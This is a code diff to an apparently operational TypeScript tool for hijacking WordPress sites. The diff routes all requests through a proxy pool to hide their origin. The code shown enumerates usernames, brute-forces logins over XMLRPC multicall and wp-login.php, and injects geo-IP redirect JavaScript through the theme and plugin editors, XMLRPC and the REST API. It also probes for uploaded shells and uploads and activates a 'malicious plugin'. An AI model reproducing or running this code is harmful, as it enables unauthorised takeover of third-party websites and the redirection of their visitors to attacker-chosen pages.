@@ -16,6 +16,20 @@
 import { fetchWithPoolProxy } from "./proxy-pool";
 import * as zlib from "zlib";
 
+// Helper: wrap fetch with proxy pool for all WP admin requests
+async function wpFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  const timeout = 15000; // default timeout for WP admin operations
+  try {
+    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout });
+    return response;
+  } catch (e: any) {
+    // Fallback: if proxy fails completely, create a minimal error response
+    throw e;
+  }
+}
+
+
 export interface WpAdminConfig {
   targetUrl: string;
   redirectUrl: string;
@@ -89,7 +103,7 @@ async function enumerateWpUsernames(targetUrl: string, progress: (m: string, d: 
 
   // Method 1: REST API /wp-json/wp/v2/users
   try {
-    const resp = await fetch(`${baseUrl}/wp-json/wp/v2/users?per_page=20`, {
+    const resp = await wpFetch(`${baseUrl}/wp-json/wp/v2/users?per_page=20`, {
       headers: { "User-Agent": "Mozilla/5.0" },
       signal: AbortSignal.timeout(10000),
     });
@@ -105,7 +119,7 @@ async function enumerateWpUsernames(targetUrl: string, progress: (m: string, d: 
   // Method 2: ?author=N enumeration (follow redirect to /author/username/)
   for (let i = 1; i <= 5; i++) {
     try {
-      const resp = await fetch(`${baseUrl}/?author=${i}`, {
+      const resp = await wpFetch(`${baseUrl}/?author=${i}`, {
         redirect: "manual",
         headers: { "User-Agent": "Mozilla/5.0" },
         signal: AbortSignal.timeout(8000),
@@ -124,7 +138,7 @@ async function enumerateWpUsernames(targetUrl: string, progress: (m: string, d: 
 
   // Method 3: XMLRPC wp.getAuthors (sometimes open)
   try {
-    const resp = await fetch(`${baseUrl}/xmlrpc.php`, {
+    const resp = await wpFetch(`${baseUrl}/xmlrpc.php`, {
       method: "POST",
       headers: { "Content-Type": "text/xml" },
       body: `<?xml version="1.0"?><methodCall><methodName>wp.getAuthors</methodName><params><param><value><int>1</int></value></param><param><value><string>admin</string></value></param><param><value><string>admin</string></value></param></params></methodCall>`,
@@ -145,7 +159,7 @@ async function enumerateWpUsernames(targetUrl: string, progress: (m: string, d: 
         log: testUser, pwd: "wrong_password_test", "wp-submit": "Log In",
         redirect_to: `${baseUrl}/wp-admin/`, testcookie: "1",
       });
-      const resp = await fetch(`${baseUrl}/wp-login.php`, {
+      const resp = await wpFetch(`${baseUrl}/wp-login.php`, {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded", "Cookie": "wordpress_test_cookie=WP%20Cookie%20check" },
         body: formData.toString(),
@@ -182,7 +196,7 @@ async function xmlrpcMulticallBruteForce(
 
   // Check if XMLRPC is available
   try {
-    const checkResp = await fetch(xmlrpcUrl, {
+    const checkResp = await wpFetch(xmlrpcUrl, {
       method: "POST",
       headers: { "Content-Type": "text/xml" },
       body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
@@ -222,7 +236,7 @@ async function xmlrpcMulticallBruteForce(
 </methodCall>`;
 
       try {
-        const resp = await fetch(xmlrpcUrl, {
+        const resp = await wpFetch(xmlrpcUrl, {
           method: "POST",
           headers: { "Content-Type": "text/xml", "User-Agent": "Mozilla/5.0" },
           body: multicallXml,
@@ -275,7 +289,7 @@ async function wpLoginBruteForce(config: WpAdminConfig): Promise<{
 
   // First check if wp-login.php exists
   try {
-    const checkResp = await fetch(loginUrl, {
+    const checkResp = await wpFetch(loginUrl, {
       method: "GET",
       redirect: "follow",
       signal: AbortSignal.timeout(10000),
@@ -315,7 +329,7 @@ async function wpLoginBruteForce(config: WpAdminConfig): Promise<{
         testcookie: "1",
       });
 
-      const resp = await fetch(loginUrl, {
+      const resp = await wpFetch(loginUrl, {
         method: "POST",
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
@@ -429,7 +443,7 @@ async function injectViaThemeEditor(
     progress("theme_editor", "กำลังหา active theme...");
     
     const themeEditorUrl = `${baseUrl}/wp-admin/theme-editor.php`;
-    const editorResp = await fetch(themeEditorUrl, {
+    const editorResp = await wpFetch(themeEditorUrl, {
       headers: {
         Cookie: cookies,
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -481,7 +495,7 @@ async function injectViaThemeEditor(
       submit: "Update File",
     });
 
-    const updateResp = await fetch(`${baseUrl}/wp-admin/theme-editor.php`, {
+    const updateResp = await wpFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
       method: "POST",
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -510,7 +524,7 @@ async function injectViaThemeEditor(
     progress("theme_editor", "ลอง inject เข้า header.php...");
     
     const headerEditorUrl = `${baseUrl}/wp-admin/theme-editor.php?file=header.php&theme=${theme}`;
-    const headerResp = await fetch(headerEditorUrl, {
+    const headerResp = await wpFetch(headerEditorUrl, {
       headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
       redirect: "follow",
       signal: AbortSignal.timeout(15000),
@@ -542,7 +556,7 @@ async function injectViaThemeEditor(
           submit: "Update File",
         });
 
-        const headerUpdateResp = await fetch(`${baseUrl}/wp-admin/theme-editor.php`, {
+        const headerUpdateResp = await wpFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
           method: "POST",
           headers: {
             "Content-Type": "application/x-www-form-urlencoded",
@@ -589,7 +603,7 @@ async function injectViaPluginEditor(
     progress("plugin_editor", "กำลังเข้า Plugin Editor...");
     
     const pluginEditorUrl = `${baseUrl}/wp-admin/plugin-editor.php`;
-    const editorResp = await fetch(pluginEditorUrl, {
+    const editorResp = await wpFetch(pluginEditorUrl, {
       headers: {
         Cookie: cookies,
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -619,7 +633,7 @@ async function injectViaPluginEditor(
       progress("plugin_editor", `ลอง inject เข้า plugin: ${plugin}...`);
 
       const pluginFileUrl = `${baseUrl}/wp-admin/plugin-editor.php?plugin=${plugin}`;
-      const pluginResp = await fetch(pluginFileUrl, {
+      const pluginResp = await wpFetch(pluginFileUrl, {
         headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
         redirect: "follow",
         signal: AbortSignal.timeout(15000),
@@ -649,7 +663,7 @@ async function injectViaPluginEditor(
         submit: "Update File",
       });
 
-      const updateResp = await fetch(`${baseUrl}/wp-admin/plugin-editor.php`, {
+      const updateResp = await wpFetch(`${baseUrl}/wp-admin/plugin-editor.php`, {
         method: "POST",
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
@@ -696,7 +710,7 @@ async function injectViaXmlrpc(
 
   try {
     // Check XMLRPC availability
-    const checkResp = await fetch(xmlrpcUrl, {
+    const checkResp = await wpFetch(xmlrpcUrl, {
       method: "POST",
       headers: { "Content-Type": "text/xml" },
       body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
@@ -727,7 +741,7 @@ async function injectViaXmlrpc(
   </params>
 </methodCall>`;
 
-      const optResp = await fetch(xmlrpcUrl, {
+      const optResp = await wpFetch(xmlrpcUrl, {
         method: "POST",
         headers: { "Content-Type": "text/xml" },
         body: editOptionsXml,
@@ -766,7 +780,7 @@ async function injectViaXmlrpc(
   </params>
 </methodCall>`;
 
-      const postsResp = await fetch(xmlrpcUrl, {
+      const postsResp = await wpFetch(xmlrpcUrl, {
         method: "POST",
         headers: { "Content-Type": "text/xml" },
         body: getPostsXml,
@@ -797,7 +811,7 @@ async function injectViaXmlrpc(
   </params>
 </methodCall>`;
 
-        const editResp = await fetch(xmlrpcUrl, {
+        const editResp = await wpFetch(xmlrpcUrl, {
           method: "POST",
           headers: { "Content-Type": "text/xml" },
           body: editPostXml,
@@ -842,7 +856,7 @@ async function injectViaRestApi(
     // Try to get pages via REST API
     progress("rest_api_inject", "ลอง REST API injection...");
 
-    const pagesResp = await fetch(`${baseUrl}/wp-json/wp/v2/pages?per_page=5`, {
+    const pagesResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/pages?per_page=5`, {
       headers: {
         Authorization: authHeader,
         "User-Agent": "Mozilla/5.0",
@@ -863,7 +877,7 @@ async function injectViaRestApi(
         const jsRedirect = generateGeoIpJsRedirect(config.redirectUrl);
         const originalContent = targetPage.content?.rendered || "";
 
-        const updateResp = await fetch(`${baseUrl}/wp-json/wp/v2/pages/${pageId}`, {
+        const updateResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/pages/${pageId}`, {
           method: "POST",
           headers: {
             Authorization: authHeader,
@@ -890,7 +904,7 @@ async function injectViaRestApi(
     }
 
     // Try posts
-    const postsResp = await fetch(`${baseUrl}/wp-json/wp/v2/posts?per_page=5`, {
+    const postsResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/posts?per_page=5`, {
       headers: { Authorization: authHeader, "User-Agent": "Mozilla/5.0" },
       signal: AbortSignal.timeout(15000),
     });
@@ -902,7 +916,7 @@ async function injectViaRestApi(
         // Use geo-IP redirect (like che.buet.ac.bd) instead of simple redirect
         const jsRedirect = generateGeoIpJsRedirect(config.redirectUrl);
 
-        const updateResp = await fetch(`${baseUrl}/wp-json/wp/v2/posts/${post.id}`, {
+        const updateResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/posts/${post.id}`, {
           method: "POST",
           headers: {
             Authorization: authHeader,
@@ -930,7 +944,7 @@ async function injectViaRestApi(
 
     // Try WP Options via REST API (requires admin)
     progress("rest_api_inject", "ลอง REST API settings (siteurl/home)...");
-    const settingsResp = await fetch(`${baseUrl}/wp-json/wp/v2/settings`, {
+    const settingsResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/settings`, {
       method: "POST",
       headers: {
         Authorization: authHeader,
@@ -1001,7 +1015,7 @@ async function injectViaShellExec(
 
       for (const url of shellFormats) {
         try {
-          const resp = await fetch(url, {
+          const resp = await wpFetch(url, {
             headers: { "User-Agent": "Mozilla/5.0" },
             signal: AbortSignal.timeout(10000),
           });
@@ -1033,7 +1047,7 @@ async function injectViaShellExec(
 
         for (const url of htaccessFormats) {
           try {
-            const resp = await fetch(url, {
+            const resp = await wpFetch(url, {
               headers: { "User-Agent": "Mozilla/5.0" },
               signal: AbortSignal.timeout(10000),
             });
@@ -1149,7 +1163,7 @@ async function installMaliciousPlugin(
 
     // Get the plugin install page to get nonce
     const installUrl = `${baseUrl}/wp-admin/plugin-install.php?tab=upload`;
-    const installResp = await fetch(installUrl, {
+    const installResp = await wpFetch(installUrl, {
       headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
       redirect: "follow",
       signal: AbortSignal.timeout(15000),
@@ -1192,7 +1206,7 @@ async function installMaliciousPlugin(
 
     // Upload the plugin
     progress("malicious_plugin", `อัพโหลด plugin ZIP (${zipBuffer.length} bytes)...`);
-    const uploadResp = await fetch(`${baseUrl}/wp-admin/update.php?action=upload-plugin`, {
+    const uploadResp = await wpFetch(`${baseUrl}/wp-admin/update.php?action=upload-plugin`, {
       method: "POST",
       headers: {
         Cookie: cookies,
@@ -1218,7 +1232,7 @@ async function installMaliciousPlugin(
         let activateUrl = activateMatch[1].replace(/&amp;/g, "&");
         if (!activateUrl.startsWith("http")) activateUrl = `${baseUrl}${activateUrl}`;
         
-        await fetch(activateUrl, {
+        await wpFetch(activateUrl, {
           headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
           redirect: "follow",
           signal: AbortSignal.timeout(15000),
